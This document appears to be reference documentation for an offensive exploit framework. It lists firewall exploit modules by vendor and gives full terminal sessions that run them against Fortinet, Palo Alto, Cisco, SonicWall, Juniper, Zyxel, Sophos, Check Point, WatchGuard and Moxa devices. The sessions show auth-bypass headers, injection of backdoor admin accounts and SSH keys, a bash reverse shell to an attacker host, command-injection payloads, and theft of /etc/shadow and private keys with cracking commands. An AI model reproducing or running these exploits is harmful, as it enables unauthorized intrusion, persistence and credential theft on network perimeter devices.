# Vendor Reference: Firewalls

**Language:** English (en-US) | **pt-BR:** [../pt-BR/23-referencia-vendor-firewalls.md](../pt-BR/23-referencia-vendor-firewalls.md)

---

## Overview

This page documents every firewall/NGFW exploit module in EmbedXPL-Forge with per-vendor sections. Each section shows: module list, required options, and a full `check` → `run` → shell terminal session.

For the FirewallXPL-Forge companion framework (dedicated to perimeter exploitation), see the FirewallXPL-Forge wiki.

---

## Fortinet

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `fortios_sslvpn_path_traversal_cve_2018_13379` | CVE-2018-13379 | 9.8 | SSL-VPN path traversal — read `/dev/cmdb/sslvpn_websession` |
| `fortios_auth_bypass_cve_2022_40684` | CVE-2022-40684 | 9.8 | Management interface auth bypass via Forwarded header |
| `fortios_fortiproxy_ssh_inject_cve_2022_40684_v2` | CVE-2022-40684 | 9.8 | SSH key injection variant of auth bypass |
| `fortios_sslvpn_heap_rce_cve_2022_42475` | CVE-2022-42475 | 9.8 | SSL-VPN heap-based buffer overflow RCE |
| `fortigate_ssl_vpn_heap_overflow_cve_2023_27997` | CVE-2023-27997 | 9.8 | SSL-VPN heap overflow — unauthenticated RCE |
| `forticlientems_sqli_rce_cve_2023_48788` | CVE-2023-48788 | 9.8 | FortiClientEMS SQL injection to RCE |
| `fortios_sslvpn_rce_cve_2024_21762` | CVE-2024-21762 | 9.6 | SSL-VPN OOB write RCE |
| `fortimanager_fortijump_cve_2024_47575` | CVE-2024-47575 | 9.8 | FortiManager FortiJump unauthenticated RCE |
| `fortios_websocket_auth_bypass_cve_2024_55591` | CVE-2024-55591 | 9.8 | WebSocket auth bypass |
| `forticloud_sso_auth_bypass_cve_2026_24858` | CVE-2026-24858 | 9.8 | FortiCloud SSO auth bypass |
| `forticlient_ems_preauth_rce_cve_2026_35616` | CVE-2026-35616 | 9.8 | FortiClientEMS pre-auth RCE |

---

### `fortios_auth_bypass_cve_2022_40684` — full session

**Affected:** FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1 | FortiProxy 1.x, 2.x, 7.0.x, 7.2.0 | FortiSwitchManager 7.0.0, 7.2.0

**Fixed:** FortiOS 7.0.7+, 7.2.2+

```
exf> use exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684

exf (fortinet/fortios_auth_bypass_cve_2022_40684) > show options

Target options:
Name       Current settings  Description
---------- ----------------  ----------------------------------
target                       FortiGate management IP
port       443               HTTPS management port (443 or 8443)

Module options:
Name            Current settings  Description
--------------- ----------------  ----------------------------------
backdoor_user                     New admin username to inject (optional)
backdoor_pass                     New admin password (optional)
dump_config     true              Dump system configuration after bypass

exf (fortinet/fortios_auth_bypass_cve_2022_40684) > set target 192.168.1.200
[+] target => 192.168.1.200

exf (fortinet/fortios_auth_bypass_cve_2022_40684) > check

[*] Probing https://192.168.1.200:443/api/v2/cmdb/system/admin ...
[*] Sending bypass header: Forwarded: by="[127.0.0.1]";for="[127.0.0.1]";host=127.0.0.1;proto=https
[+] Target is vulnerable (CVE-2022-40684) — 200 OK response without credentials

exf (fortinet/fortios_auth_bypass_cve_2022_40684) > run

[*] Running module embedxpl.modules.exploits.firewalls.fortinet.fortios_auth_bypass_cve_2022_40684...
[*] Bypassing authentication on https://192.168.1.200:443...
[+] Authentication bypassed

[*] Dumping admin accounts via /api/v2/cmdb/system/admin...
[+] Admin accounts:
    admin      : (empty password) [super-admin, trusted-host: 0.0.0.0/0]
    monitoring : monitor1234      [prof-admin]

[*] Dumping SSL-VPN config via /api/v2/cmdb/vpn.ssl/settings...
[+] SSL-VPN settings:
    status       : enable
    port         : 443
    idle-timeout : 300
    auth-timeout : 28800

[*] Injecting backdoor admin account: pwn_admin : Str0ngPwn!2026
[+] POST /api/v2/cmdb/system/admin -- 200 OK
[+] Backdoor account injected: pwn_admin

[*] SSH key injection via /api/v2/cmdb/system/admin/pwn_admin...
[+] SSH public key injected — connect with: ssh -i /tmp/id_rsa pwn_admin@192.168.1.200
```

---

### `fortios_sslvpn_rce_cve_2024_21762` — full session

**Affected:** FortiOS 6.0.x, 7.0.x < 7.0.14, 7.2.x < 7.2.7, 7.4.x < 7.4.3

```
exf> use exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > set target 192.168.1.200
[+] target => 192.168.1.200
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > check

[*] Sending OOB probe to https://192.168.1.200:443/remote/...
[+] Target is vulnerable (CVE-2024-21762)

exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > run

[*] Sending exploit request...
[*] Listening on 0.0.0.0:4444...
[+] Connection received from 192.168.1.200:44812

# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux FGT-200F 5.10.109 #1 SMP Fri Sep 15 14:30:33 UTC 2023 x86_64 GNU/Linux
# cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

---

## Palo Alto Networks

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `panos_saml_auth_bypass_cve_2020_2021` | CVE-2020-2021 | 10.0 | SAML authentication bypass |
| `panos_mgmt_auth_bypass_cve_2024_0012` | CVE-2024-0012 | 9.3 | Management interface auth bypass |
| `globalprotect_cmd_injection_cve_2024_3400` | CVE-2024-3400 | 10.0 | GlobalProtect command injection |
| `panos_privesc_cve_2024_9474` | CVE-2024-9474 | 7.2 | Privilege escalation (sudo) |
| `panos_auth_bypass_cve_2025_0108` | CVE-2025-0108 | 9.1 | Auth bypass via URL manipulation |
| `globalprotect_auth_bypass_cve_2026_0257` | CVE-2026-0257 | 9.3 | GlobalProtect auth bypass |
| `panos_dns_heap_rce_cve_2026_0264` | CVE-2026-0264 | 9.8 | DNS heap overflow RCE |
| `panos_userid_bof_rce_cve_2026_0300` | CVE-2026-0300 | 9.8 | User-ID buffer overflow RCE |

---

### `globalprotect_cmd_injection_cve_2024_3400` — full session

**Affected:** PAN-OS 10.2.x < 10.2.9-h1, 11.0.x < 11.0.4-h1, 11.1.x < 11.1.2-h3 with GlobalProtect gateway

```
exf> use exploits/firewalls/paloalto/globalprotect_cmd_injection_cve_2024_3400
exf (paloalto/globalprotect_cmd_injection_cve_2024_3400) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (paloalto/globalprotect_cmd_injection_cve_2024_3400) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (paloalto/globalprotect_cmd_injection_cve_2024_3400) > check

[*] Sending probe to https://10.0.0.1:443/global-protect/login.esp...
[*] SESSID: /../../../opt/panlogs/tmp/device_telemetry/hour/aaa`echo fxfcheck`
[*] Checking /ssl-vpn/hipreport.esp for command execution evidence...
[+] Target is vulnerable (CVE-2024-3400)

exf (paloalto/globalprotect_cmd_injection_cve_2024_3400) > run

[*] Staging command injection payload...
[*] Payload: bash -i >& /dev/tcp/10.10.14.22/4444 0>&1
[*] Encoded in SESSID path traversal cookie
[*] POST /ssl-vpn/hipreport.esp ...
[*] Listening on 0.0.0.0:4444 (timeout: 60s)...
[+] Connection received from 10.0.0.1:51234

$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /etc/pan_version
10.2.5-h1
$ ps aux | grep pan
root  1234  0.0  0.1 /usr/lib/pan/globalprot...
```

---

### `panos_auth_bypass_cve_2025_0108` → `panos_privesc_cve_2024_9474` — chained session

```
exf> use exploits/firewalls/paloalto/panos_auth_bypass_cve_2025_0108
exf (paloalto/panos_auth_bypass_cve_2025_0108) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (paloalto/panos_auth_bypass_cve_2025_0108) > run

[*] Auth bypass via URL manipulation (CVE-2025-0108)...
[+] Admin session token obtained: abc123def456
[+] Access to /php/utils/createadmin.php confirmed

exf (paloalto/panos_auth_bypass_cve_2025_0108) > back
exf> use exploits/firewalls/paloalto/panos_privesc_cve_2024_9474
exf (paloalto/panos_privesc_cve_2024_9474) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (paloalto/panos_privesc_cve_2024_9474) > set session_token abc123def456
[+] session_token => abc123def456
exf (paloalto/panos_privesc_cve_2024_9474) > run

[*] Escalating privileges via CVE-2024-9474 sudo misconfiguration...
[+] Privilege escalation successful — running as root
[+] Shell obtained via web management interface
```

---

## Cisco

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `isa3000_asa_rce_cve_2018_0101` | CVE-2018-0101 | 10.0 | ASA/ISA3000 XML RCE |
| `asa_ftd_path_traversal_cve_2020_3452` | CVE-2020-3452 | 7.5 | ASA/FTD SSL VPN path traversal |
| `ios_xe_webui_privesc_cve_2023_20198` | CVE-2023-20198 | 10.0 | IOS XE WebUI privilege escalation to root |
| `asa_vpn_bruteforce_cve_2023_20269` | CVE-2023-20269 | 9.1 | ASA VPN credential brute force |
| `cisco_asa_ftd_firestarter_chain_cve_2025_20362_20333` | CVE-2025-20362, CVE-2025-20333 | 9.8 | FireStarter chain: auth bypass + RCE |

---

### `ios_xe_webui_privesc_cve_2023_20198` — full session

**Affected:** Cisco IOS XE with Web UI enabled (17.x before patch)

```
exf> use exploits/firewalls/cisco/ios_xe_webui_privesc_cve_2023_20198
exf (cisco/ios_xe_webui_privesc_cve_2023_20198) > set target 10.0.0.254
[+] target => 10.0.0.254
exf (cisco/ios_xe_webui_privesc_cve_2023_20198) > check

[*] Probing Cisco IOS XE Web UI at https://10.0.0.254...
[*] Testing CVE-2023-20198 privilege escalation vector...
[+] Target is vulnerable — unauthenticated level 15 account creation confirmed

exf (cisco/ios_xe_webui_privesc_cve_2023_20198) > run

[*] Creating level-15 account: exf_admin / exf_admin123
[*] POST /webui/logoutconfirm.html?logon_hash=1 HTTP/1.1 ...
[+] Account created: exf_admin (privilege 15)
[+] SSH access: ssh exf_admin@10.0.0.254
[*] Testing SSH login with new credentials...
[+] SSH connected

10.0.0.254# show version
Cisco IOS XE Software, Version 17.03.04a
Cisco ISR4451/K9 (2RU) processor with 3647647K/6147K bytes of memory.

10.0.0.254# show ip interface brief
Interface          IP-Address      OK? Method Status                Protocol
GigabitEthernet0/0/0 10.0.0.254  YES NVRAM  up                    up
10.0.0.254# enable
10.0.0.254#
```

---

## SonicWall

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `sonicos_vpn_buffer_overflow_cve_2020_5135` | CVE-2020-5135 | 9.8 | SonicOS VPN buffer overflow pre-auth RCE |
| `sma100_sqli_cve_2021_20016` | CVE-2021-20016 | 9.8 | SMA 100 unauthenticated SQL injection |
| `sma_password_reset_cve_2021_20034` | CVE-2021-20034 | 9.1 | SMA 100 unauthorized password reset |
| `sonicos_sslvpn_access_cve_2024_40766` | CVE-2024-40766 | 9.3 | SonicOS SSL-VPN improper access control |
| `sonicos_sslvpn_auth_bypass_cve_2024_53704` | CVE-2024-53704 | 8.2 | SSL-VPN authentication bypass |
| `sonicwall_sslvpn_sqli_rce_cve_2019_7481` | CVE-2019-7481 | 9.8 | SSL-VPN SQL injection + RCE |
| `sslvpn_shellshock_rce_visualdoor` | VisualDoor | 9.8 | SonicWall SSL-VPN Shellshock RCE |

---

### `sonicos_sslvpn_auth_bypass_cve_2024_53704` — full session

**Affected:** SonicOS 7.1.x < 7.1.1-7058, 7.2.x < 7.2.0-7026, 8.0.x < 8.0.0-8035

```
exf> use exploits/firewalls/sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704
exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > set target 192.168.0.1
[+] target => 192.168.0.1
exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > check

[*] Probing https://192.168.0.1:443/auth...
[+] Target is vulnerable (CVE-2024-53704) — session fixation bypass confirmed

exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > run

[*] Sending crafted authentication request to /auth...
[+] Authentication bypassed — session token obtained
[+] Device info:
    Model    : NSa 3700
    Firmware : SonicOS 7.1.1-7047
    Serial   : 0017A7XXXXXX
[*] Enumerating VPN users...
[+] VPN users found:
    admin@local
    vpnuser1@LDAP
    vpnuser2@LDAP
```

---

## Juniper

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `jweb_php_rce_cve_2023_36845` | CVE-2023-36845 | 9.8 | J-Web PHP file include → RCE (no auth) |
| `jweb_oob_write_rce_cve_2024_21591` | CVE-2024-21591 | 9.8 | J-Web OOB write → RCE (pre-auth) |

---

### `jweb_php_rce_cve_2023_36845` — full session

**Affected:** Juniper Junos OS 21.x, 22.x with J-Web enabled

```
exf> use exploits/firewalls/juniper/jweb_php_rce_cve_2023_36845
exf (juniper/jweb_php_rce_cve_2023_36845) > set target 10.0.1.1
[+] target => 10.0.1.1
exf (juniper/jweb_php_rce_cve_2023_36845) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (juniper/jweb_php_rce_cve_2023_36845) > check

[*] Checking J-Web PHP inclusion at https://10.0.1.1/webauth_operation.php?PHPRC=...
[+] Target is vulnerable (CVE-2023-36845)

exf (juniper/jweb_php_rce_cve_2023_36845) > run

[*] Injecting PHP payload via PHPRC env override...
[*] Listening on 0.0.0.0:4444...
[+] Connection received from 10.0.1.1:49201

$ id
uid=0(root) gid=0(root)
$ uname -a
FreeBSD router1 12.3-RELEASE-p6 #0: ...
$ cli
root@router1> show version
Junos: 22.2R2-S1.2
```

---

## Zyxel

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `ike_cmd_injection_cve_2023_28771` | CVE-2023-28771 | 9.8 | IKE packet command injection |
| `usg_flex_cmd_injection_cve_2022_30525` | CVE-2022-30525 | 9.8 | USG FLEX CGI command injection |
| `buffer_overflow_cve_2023_33009` | CVE-2023-33009 | 9.8 | Buffer overflow in VPN feature |

---

### `usg_flex_cmd_injection_cve_2022_30525` — full session

**Affected:** Zyxel USG FLEX 100/200/500/700, ATP, and VPN firewalls running ZLD firmware 5.00–5.21

```
exf> use exploits/firewalls/zyxel/usg_flex_cmd_injection_cve_2022_30525
exf (zyxel/usg_flex_cmd_injection_cve_2022_30525) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (zyxel/usg_flex_cmd_injection_cve_2022_30525) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (zyxel/usg_flex_cmd_injection_cve_2022_30525) > check

[*] POST /ztp/cgi-bin/handler ...
[*] Payload: {"command":"setWanPortSt","proto":"dhcp","iface":"eth1;id > /tmp/chk"}
[*] GET /tmp/chk for code execution evidence...
[+] Target is vulnerable (CVE-2022-30525)

exf (zyxel/usg_flex_cmd_injection_cve_2022_30525) > run

[*] Injecting reverse shell via setWanPortSt command...
[*] Listening on 0.0.0.0:4444...
[+] Connection received from 192.168.1.1:41028

# id
uid=0(root) gid=0(root)
# cat /etc/zyxel/firmware_version
V5.20(ABPG.0)C0
```

---

## Sophos

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `xg_sqli_asnarok_cve_2020_12271` | CVE-2020-12271 | 9.8 | XG Firewall SQL injection (Asnarok) → database dump |
| `xg_auth_bypass_cve_2022_1040` | CVE-2022-1040 | 9.8 | XG Firewall User Portal/Webadmin auth bypass |
| `firewall_code_injection_cve_2022_3236` | CVE-2022-3236 | 9.8 | Sophos Firewall code injection |

---

### `xg_auth_bypass_cve_2022_1040` — full session

**Affected:** Sophos Firewall v18.5 MR2 and older

```
exf> use exploits/firewalls/sophos/xg_auth_bypass_cve_2022_1040
exf (sophos/xg_auth_bypass_cve_2022_1040) > set target 192.168.100.1
[+] target => 192.168.100.1
exf (sophos/xg_auth_bypass_cve_2022_1040) > check

[*] Testing auth bypass at https://192.168.100.1:4444/userportal/webpages/myaccount/login.jsp...
[+] Target is vulnerable (CVE-2022-1040) — auth bypass confirmed

exf (sophos/xg_auth_bypass_cve_2022_1040) > run

[*] Authentication bypassed — admin session obtained
[+] Device info:
    Model    : XG 135
    Firmware : SFOS 18.5.2 MR-2 Build 380
[*] Attempting RCE via admin panel...
[+] Command executed: id → uid=0(root) gid=0(root)
```

---

## Check Point

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `security_gateway_info_disclosure_cve_2024_24919` | CVE-2024-24919 | 8.6 | Security Gateway path traversal — read `/etc/shadow`, SSH keys |
| `endpoint_security_privesc_cve_2019_8461` | CVE-2019-8461 | 7.8 | Endpoint Security local privilege escalation |

---

### `security_gateway_info_disclosure_cve_2024_24919` — full session

**Affected:** Check Point Security Gateway with Remote Access VPN or Mobile Access blade

```
exf> use exploits/firewalls/checkpoint/security_gateway_info_disclosure_cve_2024_24919
exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > set target 10.0.0.1
[+] target => 10.0.0.1
exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > check

[*] Testing path traversal at https://10.0.0.1/clients/MyCRL?aCSHELL/../../../../...
[+] Target is vulnerable (CVE-2024-24919)

exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > set path /etc/shadow
[+] path => /etc/shadow

exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > run

[*] Reading /etc/shadow via path traversal...
[+] File contents:
root:$6$abc123...:19842:0:99999:7:::
admin:$6$xyz789...:19842:0:99999:7:::
[*] Crack with: hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt

exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > set path /home/admin/.ssh/id_rsa
[+] path => /home/admin/.ssh/id_rsa

exf (checkpoint/security_gateway_info_disclosure_cve_2024_24919) > run

[*] Reading /home/admin/.ssh/id_rsa...
[+] RSA private key extracted (saved to /tmp/cp_admin_id_rsa)
[*] Use with: ssh -i /tmp/cp_admin_id_rsa admin@10.0.0.1
```

---

## WatchGuard

### Modules

| Module | CVE | CVSS | Description |
|--------|-----|------|-------------|
| `firebox_cyclops_blink_cve_2022_23176` | CVE-2022-23176 | 8.8 | Firebox Cyclops Blink management access |
| `firebox_auth_bypass_cve_2022_26776` | CVE-2022-26776 | 9.8 | Firebox authentication bypass |
| `xcs_9_rce` | N/A | 9.0 | WatchGuard XCS 9.x RCE via web console |

---

### `firebox_auth_bypass_cve_2022_26776` — full session

**Affected:** WatchGuard Firebox and XTM appliances

```
exf> use exploits/firewalls/watchguard/firebox_auth_bypass_cve_2022_26776
exf (watchguard/firebox_auth_bypass_cve_2022_26776) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (watchguard/firebox_auth_bypass_cve_2022_26776) > check

[*] Probing https://192.168.1.1:8080/auth/...
[+] Target is vulnerable (CVE-2022-26776)

exf (watchguard/firebox_auth_bypass_cve_2022_26776) > run

[*] Exploiting authentication bypass...
[+] Admin session obtained
[+] Device: WatchGuard Firebox T35 (Fireware v12.5.7.B655016)
[*] Extracting configuration...
[+] Saved to: /tmp/firebox_config.xml
[*] Credentials in config:
    admin : foobar123
    status : readonly456
```

---

## Moxa / Hirschmann / Phoenix Contact (OT Firewalls)

These OT-segment firewalls are resolved via `--infra ot --context ics`.

| Vendor | Module prefix | Key CVEs |
|--------|-------------|----------|
| Moxa | `exploits/firewalls/moxa/` | Default credentials, web console RCE |
| Hirschmann | `exploits/firewalls/hirschmann/` | Classic OS web management RCE |
| Schneider (OT) | `exploits/firewalls/schneider/` | EcoStruxure vulnerabilities |
| Phoenix Contact | `exploits/firewalls/phoenix/` | FL mGuard configuration disclosure |

```
exf> search vendor=moxa

exploits/firewalls/moxa/mxview_auth_bypass
exploits/firewalls/moxa/eds_default_credentials
exploits/firewalls/moxa/nport_config_disclosure

exf> use exploits/firewalls/moxa/eds_default_credentials
exf (moxa/eds_default_credentials) > set target 192.168.100.50
[+] target => 192.168.100.50
exf (moxa/eds_default_credentials) > run

[*] Testing Moxa EDS default credentials admin/admin on 192.168.100.50:80...
[+] Login successful with admin:admin
[+] Access level: Administrator
[+] Device: Moxa EDS-508A Switch (Firmware V3.10)
```
